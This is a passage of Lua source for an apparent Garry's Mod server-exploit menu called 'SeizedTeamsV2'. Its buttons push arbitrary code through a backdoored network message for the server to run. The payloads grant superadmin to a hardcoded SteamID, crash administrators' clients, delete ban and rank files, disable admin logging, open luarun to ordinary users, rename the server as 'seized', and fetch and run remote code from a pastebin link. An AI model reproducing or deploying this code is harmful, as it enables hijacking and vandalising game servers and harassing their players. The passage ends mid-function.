Macro:SetPos( 20, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin wazzak" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), " est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Superadmin " )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:315052913\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "STEAM_0:0:315052913 est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end



local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Crash Admins" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Les admins ont crash :)" )
    SploitNotify("Tout les admins vont crash !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Pousser tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Pousser tout le monde activ�" )
    SploitNotify("Tout le monde se pousse !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller) 
Macro:SetPos( 380, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Reset argent" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Argent reset" )
    SploitNotify("Argent reset")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Inverse la gravite" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Gravit� invers�" )
    SploitNotify("Gravit� invers� � -600")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Niquer la physique" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Physic niqu�" )
    SploitNotify("Physic change � -8")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Hurlement" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Hurlement activ� !" )
    SploitNotify("Hurlement activ�")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "map gm_construct" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"map\", \"gm_construct\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Map chang� � GM_CONSTRUCT" )
    SploitNotify("Map change GM_CONSTRUCT")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Supprimer les grades" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Grades supprim�s" )
    SploitNotify("Grades supprimes.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Bruler tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde br�le" )
    SploitNotify("Tout le monde brule !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 330 )
Macro:SetText( "Deban ALL" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde est debanni" )
    SploitNotify("Deban ALL.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 360 )
Macro:SetText( "Tuer tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde est mort" )
    SploitNotify("Tout le monde est mort !)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Grosse tete" ) 
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde � une grosse t�te :)" )
	    SploitNotify("Tout le monde � une grosse t�te")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 60 )
Macro:SetText( "STOP 2D player" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "2D player d�sactiv� !" )
	    SploitNotify("2D player d�sactiv� !")
    surface.PlaySound("buttons/blip1.wav") 
		net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(1,1,1))
        v:ManipulateBoneScale( b, Vector(1,1,1))
        v:ManipulateBoneScale( c, Vector(1,1,1))
        v:ManipulateBoneScale( d, Vector(1,1,1))
        v:ManipulateBoneScale( e, Vector(1,1,1))
        v:ManipulateBoneScale( f, Vector(1,1,1))
        v:ManipulateBoneScale( g, Vector(1,1,1))
        v:ManipulateBoneScale( h, Vector(1,1,1))
        v:ManipulateBoneScale( i, Vector(1,1,1))
        v:ManipulateBoneScale( j, Vector(1,1,1))
        v:ManipulateBoneScale( k, Vector(1,1,1))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 	

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 90 )
Macro:SetText( "M9K Nuke" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Une nuke va exploser quelques part ! :o" )
    SploitNotify("Une nuke va exploser ! (m9k requis)")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[
local rocket = ents.Create("m9k_launched_davycrockett")
local ply2 = table.Random(player.GetAll())
if ply2 == ply then ply:ChatPrint("[RunString] Prevented epicentre from being you.") else
    rocket:SetPos(ply2:GetPos())
    rocket:SetOwner(ply2)
    rocket.Owner = ply2
    rocket:Spawn()
    rocket:Activate()
ply:ChatPrint("[RunString] Allahu akbar.")  
end]])			
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 120 )
Macro:SetText( "Hostname" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Nom du serv. changer en Seized By SeizedTeam" )
    SploitNotify("Nom du serv. changer en SEIZED BY SEIZEDTEAM")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"rcon\", \"hostname\", \"SERVEUR SEIZED BY SeizedTeam\")")		
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 150 )
Macro:SetText( "Forcer a dire une chose" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde dit 'i love SeizedTeam !' " )
    SploitNotify("Tout le monde est en love sur SeizedTeam !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("say I love SeizedTeam <3")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 180 )
Macro:SetText( "DECO RECO ALL" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde se deco/reco ! " )
    SploitNotify("Déco/reco de tous les joueurs")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("retry")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 210 )
Macro:SetText( "Force say : Je suis un fdp" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde dit 'j'ai un petit zizi <3)'" )
    SploitNotify("Tout le monde dit 'j'ai un petit zizi <3")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("say je suis un FDP")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 240 )
Macro:SetText( "Luarun en user" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Luarun en user OK." )
    SploitNotify("Luarun set en user !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"groupallow\", \"user\", \"ulx luarun\")")
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 500, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "changer de nom" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/1NLhWtAw\",function(b,l,h,c)RunString(b)end,nil)" ) // Check
net.WriteBit (1)
net.SendToServer()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Tout le monde change de nom :')" )
	    SploitNotify("Tout le monde change de nom :')")
    surface.PlaySound("buttons/blip1.wav") 
        net.WriteBit(1)
        net.SendToServer()
end  


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 270 )
Macro:SetText( "ULX LOGECHO 0" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "ULX LOGECHO 0" )
    SploitNotify("ULX LOGECHO 0")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"logecho\", \"0\")")
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 300 )
Macro:SetText( "Danse" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Danse" )
    SploitNotify("Danse")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 330 )
Macro:SetText( "Droite" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "+right" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+right")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 360 )
Macro:SetText( "SNEAK" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "+duck" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+duck")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 390 )
Macro:SetText( "ARRIERE" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+back")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 420 )
Macro:SetText( "forward" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 450 )
Macro:SetText( "undo" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "undo" )
    SploitNotify("undo")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("undo")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 480 )
Macro:SetText( "Stop right/etc" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
